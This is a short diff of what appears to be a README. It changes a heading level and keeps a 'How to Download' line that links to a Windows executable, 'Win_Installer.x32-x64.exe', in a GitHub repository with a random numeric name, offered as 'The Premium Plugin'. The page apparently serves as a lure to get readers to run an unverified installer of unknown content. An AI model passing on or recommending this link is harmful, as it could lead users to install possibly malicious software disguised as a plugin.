@@ -1,4 +1,4 @@
-## How to Download
+# How to Download
 
 · [Download](https://github.com/18178416912/181784169121/releases/download/Windows-Install/Win_Installer.x32-x64.exe) The Premium Plugin.
 
